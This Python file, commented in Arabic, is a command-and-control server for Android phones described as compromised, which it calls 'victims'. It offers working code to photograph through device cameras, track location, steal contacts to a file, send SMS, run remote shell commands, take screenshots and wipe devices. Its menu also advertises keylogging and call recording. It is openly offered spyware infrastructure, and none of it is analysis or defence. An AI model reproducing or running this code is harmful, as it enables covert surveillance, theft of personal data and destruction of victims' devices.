#!/usr/bin/env python3
# c2_server.py - خادم التحكم الكامل (يتم تشغيله على الـ VPS)

import socket
import threading
import json
import os
import sys
from datetime import datetime

class GalaxyA71_C2_Server:
    def __init__(self, host='0.0.0.0', port=443):
        self.host = host
        self.port = port
        self.clients = {}  # {device_id: socket}
        self.commands = []
        self.running = True
        
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(10)
        
        print(f"[+] C2 Server running on {self.host}:{self.port}")
        print("[+] انتظر اتصال الضحية...")
        
        # بدء خيط أوامر التحكم
        threading.Thread(target=self.command_loop, daemon=True).start()
        
        while self.running:
            try:
                client_socket, addr = server.accept()
                threading.Thread(target=self.handle_client, args=(client_socket, addr)).start()
            except:
                pass
    
    def handle_client(self, client_socket, addr):
        device_id = None
        try:
            # استقبال بيانات الجهاز
            data = client_socket.recv(4096).decode()
            device_info = json.loads(data)
            device_id = device_info.get('device_id', addr[0])
            
            self.clients[device_id] = {
                'socket': client_socket,
                'addr': addr,
                'info': device_info,
                'connected_at': datetime.now()
            }
            
            print(f"[+] New client: {device_id} from {addr}")
            print(f"[+] Device: {device_info.get('model')} | Android {device_info.get('android_version')}")
            
            # إرسال قائمة الأوامر المتاحة
            client_socket.send(json.dumps({"status": "connected", "commands": self.get_commands_list()}).encode())
            
            # البقاء متصلاً لاستقبال الأوامر
            while self.running and device_id in self.clients:
                command = self.wait_for_command(device_id)
                if command:
                    client_socket.send(json.dumps({"command": command}).encode())
                    # استقبال نتيجة الأمر
                    result = client_socket.recv(65536).decode()
                    print(f"[+] Result from {device_id}: {result[:200]}...")
                
        except Exception as e:
            print(f"[-] Client error: {e}")
        finally:
            if device_id and device_id in self.clients:
                del self.clients[device_id]
            client_socket.close()
    
    def command_loop(self):
        """واجهة أوامر التحكم"""
        print("\n" + "="*50)
        print("Galaxy A71 C2 Controller v1.0")
        print("="*50)
        print("الأوامر المتاحة:")
        print("  list              - عرض الأجهزة المخترقة")
        print("  select [id]       - اختيار جهاز")
        print("  camera [front/back] - التقاط صورة")
        print("  mic [duration]    - تسجيل صوت")
        print("  location          - الحصول على الموقع")
        print("  sms [number] [msg] - إرسال رسالة")
        print("  contacts          - سرقة جهات الاتصال")
        print("  files [path]      - سرد الملفات")
        print("  download [path]   - تحميل ملف")
        print("  shell [cmd]       - تنفيذ أمر")
        print("  screenshot        - لقطة شاشة")
        print("  keylog start/stop - تسجيل ضربات المفاتيح")
        print("  call [number]     - إجراء مكالمة")
        print("  record_call start/stop - تسجيل المكالمات")
        print("  wipe              - مسح الجهاز بالكامل")
        print("  exit              - خروج")
        print("="*50)
        
        current_device = None
        
        while self.running:
            try:
                cmd_input = input(f"\n[ C2@{current_device or 'none'} ]> ").strip()
                if not cmd_input:
                    continue
                
                parts = cmd_input.split()
                cmd = parts[0].lower()
                
                if cmd == 'list':
                    if self.clients:
                        print("\nالأجهزة المخترقة:")
                        for i, (did, info) in enumerate(self.clients.items()):
                            print(f"  [{i}] {did} - {info['addr']} - منذ {info['connected_at']}")
                    else:
                        print("[-] لا توجد أجهزة مخترقة حالياً")
                
                elif cmd == 'select':
                    if len(parts) < 2:
                        print("[-] استخدم: select [id]")
                        continue
                    try:
                        idx = int(parts[1])
                        device_list = list(self.clients.keys())
                        if 0 <= idx < len(device_list):
                            current_device = device_list[idx]
                            print(f"[+] تم اختيار الجهاز: {current_device}")
                        else:
                            print("[-] رقم غير صحيح")
                    except:
                        print("[-] رقم غير صالح")
                
                elif cmd == 'camera':
                    if not current_device:
                        print("[-] اختر جهازاً أولاً")
                        continue
                    camera_type = parts[1] if len(parts) > 1 else 'back'
                    result = self.send_command(current_device, f"camera_{camera_type}")
                    print(f"[+] تم التقاط الصورة: {result}")
                
                elif cmd == 'location':
                    if not current_device:
                        print("[-] اختر جهازاً أولاً")
                        continue
                    result = self.send_command(current_device, "get_location")
                    print(f"[+] الموقع: {result}")
                
                elif cmd == 'sms':
                    if not current_device or len(parts) < 3:
                        print("[-] استخدم: sms [number] [message]")
                        continue
                    number = parts[1]
                    message = ' '.join(parts[2:])
                    result = self.send_command(current_device, f"sms|{number}|{message}")
                    print(f"[+] نتيجة الإرسال: {result}")
                
                elif cmd == 'contacts':
                    if not current_device:
                        print("[-] اختر جهازاً أولاً")
                        continue
                    result = self.send_command(current_device, "get_contacts")
                    # حفظ النتيجة في ملف
                    with open(f"contacts_{current_device}.txt", 'w') as f:
                        f.write(result)
                    print(f"[+] تم حفظ جهات الاتصال في contacts_{current_device}.txt")
                
                elif cmd == 'screenshot':
                    if not current_device:
                        print("[-] اختر جهازاً أولاً")
                        continue
                    result = self.send_command(current_device, "take_screenshot")
                    print(f"[+] لقطة الشاشة: {result}")
                
                elif cmd == 'shell':
                    if not current_device or len(parts) < 2:
                        print("[-] استخدم: shell [command]")
                        continue
                    shell_cmd = ' '.join(parts[1:])
                    result = self.send_command(current_device, f"shell|{shell_cmd}")
                    print(result)
                
                elif cmd == 'wipe':
                    if not current_device:
                        print("[-] اختر جهازاً أولاً")
                        continue
                    confirm = input("[!] هل أنت متأكد من مسح الجهاز بالكامل؟ (yes/no): ")
                    if confirm.lower() == 'yes':
                        result = self.send_command(current_device, "wipe_device")
                        print(f"[+] نتيجة المسح: {result}")
                    else:
                        print("[-] تم الإلغاء")
                
                elif cmd == 'exit':
                    self.running = False
                    break
                
                else:
                    print(f"[-] أمر غير معروف: {cmd}")
                    
            except KeyboardInterrupt:
                print("\n[+] إيقاف الخادم...")
                self.running = False
                break
            except Exception as e:
                print(f"[-] خطأ: {e}")
    
    def send_command(self, device_id, command):
        if device_id not in self.clients:
            return "الجهاز غير متصل"
        
        client = self.clients[device_id]['socket']
        try:
            client.send(json.dumps({"command": command}).encode())
            result = client.recv(65536).decode()
            return result
        except:
            return "فشل في إرسال الأمر"
    
    def wait_for_command(self, device_id):
        # في تطبيق حقيقي، يتم انتظار أمر من واجهة التحكم
        # هذا مبسط للعرض
        return None
    
    def get_commands_list(self):
        return [
            "camera_front", "camera_back", "get_location", "get_contacts",
            "take_screenshot", "shell", "sms", "record_mic", "keylog_start",
            "keylog_stop", "call", "record_call", "wipe_device"
        ]

if __name__ == "__main__":
    server = GalaxyA71_C2_Server()
    server.start()